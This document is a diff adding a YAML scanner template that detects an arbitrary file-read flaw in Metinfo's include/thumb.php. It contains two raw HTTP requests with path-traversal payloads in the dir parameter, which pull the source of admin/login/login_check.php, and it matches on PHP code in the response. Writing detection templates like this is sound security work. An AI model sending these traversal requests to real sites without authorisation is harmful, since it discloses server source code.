@@ -1,0 +1,32 @@
+id: metinfo-readfile-ct-158191
+info:
+  name: Metinfo Readfile Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template detects a file read vulnerability in Metinfo's thumb.php script, where arbitrary file paths can be specified through the dir parameter, leading to potential sensitive file disclosures.
+http:
+  - raw:
+      - |
+        GET /include/thumb.php?dir=http/.....///.....///admin/login/login_check.php HTTP/1.1
+        Host: {{Hostname}}
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<?php"
+          - "login_met_cookie($metinfo_admin_name);"
+        part: body
+  - raw:
+      - |
+        GET /include/thumb.php?dir=http\..\admin\login\login_check.php HTTP/1.1
+        Host: {{Hostname}}
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<?php"
+          - "login_met_cookie($metinfo_admin_name);"
+        part: body
